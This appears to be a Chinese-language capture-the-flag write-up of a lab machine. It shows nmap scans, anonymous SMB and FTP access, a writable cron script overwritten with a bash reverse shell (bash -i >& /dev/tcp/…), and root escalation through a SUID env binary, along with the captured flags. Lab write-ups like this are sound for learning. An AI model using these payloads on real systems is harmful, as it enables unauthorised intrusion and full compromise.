# 1. 端口探测

```shell
C:\Users\ME\Desktop
# nmap  --reason -p- --min-rate 10000 10.10.215.155
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-21 00:25 中国标准时间
Nmap scan report for 10.10.215.155
Host is up, received echo-reply ttl 63 (0.27s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds

C:\Users\ME\Desktop
# nmap -p 21,22,139,445 10.10.215.155 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-21 00:26 中国标准时间
NSOCK ERROR [0.0400s] ssl_init_helper(): OpenSSL legacy provider failed to load.

Nmap scan report for 10.10.215.155
Host is up (0.24s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.2.147
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey:
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb2-time:
|   date: 2024-01-20T16:26:54
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds
```

通过上面的扫描发现FTP服务存在匿名登录漏洞及Samba匿名访问



# 2. SMB 匿名访问

有点歪了，我看到两张柯基图片以为是图片隐写，解半天没解出来，思路有点歪了

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ./nxc smb 10.10.215.155 -u ' ' -p ' ' --shares
SMB         10.10.215.155   445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)                                                                                                                   
SMB         10.10.215.155   445    ANONYMOUS        [+] \ :  
SMB         10.10.215.155   445    ANONYMOUS        [*] Enumerated shares
SMB         10.10.215.155   445    ANONYMOUS        Share           Permissions     Remark
SMB         10.10.215.155   445    ANONYMOUS        -----           -----------     ------
SMB         10.10.215.155   445    ANONYMOUS        print$                          Printer Drivers
SMB         10.10.215.155   445    ANONYMOUS        pics            READ            My SMB Share Directory for Pics
SMB         10.10.215.155   445    ANONYMOUS        IPC$                            IPC Service (anonymous server (Samba, Ubuntu))           

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient \\\\10.10.215.155\\pics                  
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020
```

# 3. FTP 匿名登陆

FTP匿名登录后发现下面有一个清理脚本会自动运行，我们可以使用在其中添入反弹shell的代码将其覆盖，从而在其下次自动运行时获取shell，切记不能使用del删除，删除之后再上传就只有读写权限而没有执行权限了

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp Anonymous@10.10.215.155          
Connected to 10.10.215.155.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||14992|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
cd 226 Directory send OK.

ftp> cd scripts
250 Directory successfully changed.

ftp> ls
229 Entering Extended Passive Mode (|||35293|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2236 Jan 20 16:55 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

ftp> get clean.sh -
remote: clean.sh
229 Entering Extended Passive Mode (|||53774|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
226 Transfer complete.
314 bytes received in 00:01 (0.30 KiB/s)

ftp> get to_do.txt -
remote: to_do.txt
229 Entering Extended Passive Mode (|||19563|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
I really need to disable the anonymous login...it's really not safe
226 Transfer complete.
68 bytes received in 00:01 (0.06 KiB/s)

ftp> get removed_files.log -
remote: removed_files.log
229 Entering Extended Passive Mode (|||50171|)
150 Opening BINARY mode data connection for removed_files.log (2279 bytes).
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
226 Transfer complete.
2279 bytes received in 00:01 (2.19 KiB/s)

ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||17084|)
150 Ok to send data.
100% |**************************************************************************|    54      402.55 KiB/s    00:00 ETA
226 Transfer complete.
54 bytes sent in 00:01 (0.03 KiB/s)

ftp> ls -lah
229 Entering Extended Passive Mode (|||51859|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000           54 Jan 20 17:06 clean.sh
-rw-rw-r--    1 1000     1000          860 Jun 04  2020 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

ftp> get clean.sh -
remote: clean.sh
229 Entering Extended Passive Mode (|||54505|)
150 Opening BINARY mode data connection for clean.sh (54 bytes).
#!/bin/bash

bash -i >& /dev/tcp/10.8.2.147/2333 0>&1
226 Transfer complete.
54 bytes received in 00:01 (0.05 KiB/s)
```

获取到shell以后查看flag，以及使用env进行提权

```shell
C:\Users\ME\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
# nc.exe -lvvp 2333
listening on [any] 2333 ...
Warning: forward host lookup failed for ANONYMOUS: h_errno 11001: HOST_NOT_FOUND
connect to [10.8.2.147] from ANONYMOUS [10.10.215.155] 60944: HOST_NOT_FOUND
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ whoami
whoami
namelessone

namelessone@anonymous:~$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

namelessone@anonymous:~$ cat /home/namelessone/user.txt
cat /home/namelessone/user.txt
90d6f992585815ff991e68748c414740

namelessone@anonymous:~$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified

namelessone@anonymous:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec

namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root

cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

# 4. 总结

1. 又学到了新东西，在FTP匿名登陆中可以使用 `get filename -` 来进行本地查看而不是下载后再查看
2. 在FTP中发现运行的脚本时可以查看权限，若有执行权限且目标脚本每隔多久自动执行就可以写入恶意语句将其替换掉以获取shell